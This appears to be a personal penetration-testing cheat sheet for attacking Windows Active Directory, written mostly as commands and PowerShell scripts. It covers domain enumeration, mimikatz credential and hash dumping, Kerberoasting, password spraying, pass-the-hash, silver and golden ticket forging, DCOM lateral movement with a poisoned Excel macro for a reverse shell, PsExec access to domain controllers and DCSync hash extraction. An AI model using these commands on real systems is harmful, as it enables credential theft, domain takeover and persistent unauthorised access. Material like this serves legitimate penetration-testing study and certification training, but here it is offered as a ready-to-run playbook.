ENUMERATION:<<<

NET.EXE:
net user
net user /domain
net user admin /domain
net group /domain

POWERSHELL:

LDAP://HostName[:PortNumber][/DistinguishedName]

TO AUTOMATE THE PROCESS OF GATHERING WE CAN RUN

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = NewObject System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------------"
}


OTHER SAM ACCOUNT TYPES:<<
Case 0
Return "SAM_DOMAIN_OBJECT"
Case 268435456
Return "SAM_GROUP_OBJECT"
Case 268435457
Return "SAM_NON_SECURITY_GROUP_OBJECT"
Case 536870912
Return "SAM_ALIAS_OBJECT"
Case 536870913
Return "SAM_NON_SECURITY_ALIAS_OBJECT"
Case 805306368
Return "SAM_NORMAL_USER_ACCOUNT"
Case 805306369
Return "SAM_MACHINE_ACCOUNT"
Case 805306370
Return "SAM_TRUST_ACCOUNT"
Case 1073741824
Return "SAM_APP_BASIC_GROUP"
Case 1073741825
Return "SAM_APP_QUERY_GROUP"
Case 2147483647
Return "SAM_ACCOUNT_TYPE_MAX"

YOU CAN ALSO CHANGE THE SCRIPT AS FOLLOWS TO LIST GROUP NAMES


$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = NewObject System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}


AND IF YOU FIND A GROUP THAT IS INTERESTING


$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = NewObject System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(name=GROUP)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}



ENUMERATING LOGGED IN USERS:<<<<<<<<<<<<<<<<<<<

GRAB POWERVIEW

RUN
Import-Module .\PowerView.ps1

THEN TRY
Get-NetLoggedon -ComputerName clientcomp
AND 
Get-NetSession -ComputerName LOGONSERVERNAME

ENUMERATING THROUGH SERVICE PRINCIPAL NAMES:<<<<<<<<<

$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$SearchString

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = NewObject System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }

YOU CAN USE nslookup TO DETERMINE THE IP OF ANY INTERESTING RESULTS TO SEE IF THEY ARE INTERNET FACING OR NOT



ACTIVE DIRECTORY AUTHENTICATION:<<<<<<<<<<<<<<<


IF WE AHVE LOCAL ADMIN OR SYSTEM PRIVS WE CAN USE MIMIKATZ TO VIEW KERBEROS TICKETS AND NTLM HASHES

mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
sekurlsa::tickets

ARMED WITH A TGT WE CAN REQUEST A TGS FOR RESOURCES WE WANT TO TARGET

SERVICE ACCOUNT ATTACKS:<<<

TO ATTEMPT TO CRACK THE PASSWORD OF A SERVICE ACCOUNT WE'RE GOING TO ABUSE A SERVICE TICKET

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/SPN.SPN.COM'

YOU SHOULD BE ABLE TO LIST THE TICKETS IN MEMORY NOW AND SEE THE NEW TICKET WITH 
klist

YOU SHOULD NOW BE ABLE TO EXPORT IT WITH MIMIKATZ BY TYPING
kerberos::list /export

THEN INSTALL KERBEROAST AND RUN

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt DOWNLOADEDTICK.kirbi

ALSO LOOK FOR EMPIRE PROJECTS GITHUB WITH Invoke-Kerberoast.ps1

LOW AND SLOW PASSWORD GUESSING:<<<<<<<<<<<<<<<


USE 
net accounts
TO DETERMINE LOCKOUT THRESHOLD, DURATION, AND OBSERVATION WINDOW

WE CAN FEED ARGUMENTS TO THE DirectoryEntry OPERATOR IN OUR SCRIPT EARLIER AND USE IT FOR FEEDBACK ON PASSWORD GUESSES
WE CAN AUTOMATE THIS WITH Spray-Passwords.ps1 USING THE -Pass FLAG AND -Admin FLAG

ACTIVE DIRECTORY LATERAL MOVEMENT:<<<<<<<<,

PASS THE HASH:
USE 
pth-winexe -U user%hashfound //targ.ip.he.re cmd
TO PERFORM A PTH ATTACK ON A WINDOWS MACHINE AND LAUNCH A COMMAND PROMPT

OVERPASS THE HASH:
WITH MIMIKATZ WE CAN TURN AN NTLM HASH INTO A KERB TICKET BY USING

sekurlsa::logonpasswords
TO DETERMINE THE NEEDED CREDENTIALS AND
sekurlsa::pth /user:USERNAME /domain:TARGETDOMAIN /ntlm:NTLMHASH /run:PowerShell.exe

THEN USE
net use \\domaincontrollername
AND 
klist
TO DISPLAY THE TICKET

WE CAN THEN USE .\PsExec.exe \\DOMAINCONTROLLERNAME cmd.exe

TO EXECUTE A COMMAND PROMPT ON THE DOMAIN CONTROLLER

PASS THE TICKET:<<<<<<

IF WE CAN CRACK THE SERVICE ACCOUNT PASSWORD WE MAY BE ABLE TO USE PASS THE TICKET 
TO CREATE A TICKET WE CAN USE TO ACCESS THAT ACCOUNT FROM OTHER MACHINES
WE CAN USE 
whoami /user
AND EXTRACT THE SID, IGNORE THE LAST 4 THATS THE rid
THEN INSIDE MIMIKATZ USE
kerberos::purge
AND THEN 
kerberos::golden /user:USERACCT /domain:DOMAIN.COM /sid:ENUMERATEDSID /target:IISSERVER.DOMAIN.COM /service:HTTP /rc4:PASSWORDHASHOFSERVICEACCT /ppt
THEN
kerberos::list 
TO VIEW THE TICKET

LATERAL MOVEMENT USING DCOM:<<<<<<<<<<
IF WE HAVE REMOTE ACCESS TO AN SMB SHARE ON A REMOTE WORKSTATION, AND HAVE OFFICE INSTALLED WE CAN ON BOTH COMPUTERS WE
CAN ENUMERATE THE REMOTE WORKSTATIONS METHODS, AND USE A POWERSHELL SCRIPT IF RUN AND WORKBOOK HAVE PROPER PERMISISONS TO USE
MACRO POISONING TO GET A REVERSE SHELL

GO BACK TO THE MACRO POISONING SECTION AND MAKE A POISING MACRO WITH A LISTENER, THEN USE

$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "worksta.ip.he.re"))

$LocalPath = "C:\Users\adminacc\excel.xls"

$RemotePath = "\\worksta.ip.he.re\share$\excel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\worksta.ip.he.re\share$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")

WHERE THE FIRST LINE CHECKS THE METHODS, THE 2-4 LINES COPY THE POISONED EXCEL SHEET TO THE LOCAL ON THE REMOTE TARGET
THE 5-6 CREATE A PROFILE FOR SYSTEM AND THE LAST TWO RUN THE POISONED MACRO AFTER OPENING THE FILE

ACTIVE DIRECTORY PERSISTENCE:<<<<<<<<<

IF WE CAN GAIN ACCESS TO A DOMAIN CONTROLLER AND RUN MIMIKATZ WE CAN MAKE  REAL GOLDEN TICKET AS FOLLOWS
privilege::debug
lsadump::lsa /patch
AND LOOK FOR THE NTLM HASH FOR KRBTGT
IF WE CAN GET IT RERUN GOLDEN WITH THESE OPTIONS AFTER A kerberos::purge

kerberos::golden /user:fakeuser /domain:DOMAIN.COM /sid:ENUMERATEDSID /krbtgt:THEKRBHASH /ppt
THEN
WE CAN RUN
misc::cmd
AND IF WE USE THE DOMAIN NAME AND !!NOT THE IP!! WITH PSEXEC WE CAN GET A COMMAND PROMPT ON THE DOMAIN CONTROLLER

psexec.exe \\dc01 cmd.exe

FROM THERE
DOMAIN CONTROLLER SYNC:<<<<
IF WE ARE A MEMBER OF THE DOMAIN ADMINS GROUP
whoami /groups

WE CAN USE 
lsadump::dcsync /user:Administrator
WE CAN DUMP TONS OF NTLM HASHES INCLUDING DOMAIN CONTROLLER ADMINISTRATORS




